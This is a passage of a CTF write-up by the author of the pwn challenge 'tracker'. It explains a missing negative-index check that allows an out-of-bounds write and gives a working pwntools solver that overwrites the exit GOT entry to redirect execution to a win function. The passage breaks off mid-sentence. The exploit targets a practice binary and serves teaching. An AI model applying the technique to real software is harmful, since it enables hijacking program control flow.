---

layout: post

title: "Tracker - Negative Index to GOT Overwrite"

date: 2026-09-25

tags: [ctf, pwn]

---



I authored this easy pwn challenge for NileCTF 2026. The binary is called `tracker`. It asks for an index and then stores an eight-byte value in a global `notes` array.



At first, the program looks like it checks the index correctly. It rejects values greater than `7`, so the valid indexes seem to be `0` through `7`. The missing check is for negative numbers. That gives us a write before the start of the array.



The binary also has a `win` function that prints the flag. The goal is to use the out-of-bounds write to make the program call `win` when it tries to exit.



## Looking at `main()`



This is the relevant part of the function in Ghidra:



```c

undefined8 main(void)

{

  int iVar1;

  long in_FS_OFFSET;

  int local_1c;

  undefined8 local_18;

  long local_10;



  local_10 = *(long *)(in_FS_OFFSET + 0x28);

  setvbuf(stdout,(char *)0x0,2,0);

  printf("Index: ");

  iVar1 = __isoc23_scanf(&DAT_00402014,&local_1c);

  if (iVar1 == 1) {

    if (7 < local_1c) {

      puts("Out of bounds");

      exit(1);

    }

    printf("Value: ");

    iVar1 = __isoc23_scanf(&DAT_0040202d,&local_18);

    if (iVar1 == 1) {

      *(undefined8 *)(notes + (long)local_1c * 8) = local_18;

      puts("Done");

      exit(0);

    }

  }

  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {

    return 1;

  }

  __stack_chk_fail();

}

```



The program reads the index into `local_1c`. It only checks whether the index is greater than `7`:



```c

if (7 < local_1c) {

  puts("Out of bounds");

  exit(1);

}

```



There is no check that the index is zero or greater. A negative value passes this condition.



The value is then written using the index multiplied by eight:



```c

*(undefined8 *)(notes + (long)local_1c * 8) = local_18;

```



The array contains eight-byte entries, so an index of `-1` writes eight bytes before `notes`, an index of `-2` writes sixteen bytes before it, and so on. This is the out-of-bounds write we need.



## Finding the target



The binary contains a `win` function that prints the flag.



The program calls `exit(0)` after the write:



```c

puts("Done");

exit(0);

```



The next step is to change where this call goes. Dynamically linked Linux binaries use the Global Offset Table, or GOT, to store addresses for functions such as `exit` and `puts`. When the program calls `exit`, it loads the function address from the `exit` entry in the GOT.



For this challenge, the relevant GOT entry is writable. If we replace the address stored there with the address of `win`, the later `exit(0)` call will enter `win` instead.



## Calculating the negative index



The write starts at `notes` and advances by `index * 8`. We need the index that reaches the GOT entry for `exit`:



```python

offset_bytes = elf.got['exit'] - elf.sym['notes']

index = offset_bytes // 8

```



Because the `exit` GOT entry is located before the `notes` array in memory, the result is negative. Sending that index makes the write land on the `exit` GOT entry.



The value written there is the address of `win`:



```python

str(elf.sym['win']).encode()

```



After the overwrite, the program reaches `exit(0)`, looks up the address in the GOT, and jumps to `win` instead. The `win` function prints the flag.



## Solver



```python

from pwn import *



elf = ELF("./tracker")

p = process("./tracker")



offset_bytes = elf.got['exit'] - elf.sym['notes']

index = offset_bytes // 8



p.sendlineafter(b"Index: ", str(index).encode())

p.sendlineafter(b"Value: ", str(elf.sym['win']).encode())



p.interactive()

```



The script loads the binary with pwntools, calculates the index from the symbol add
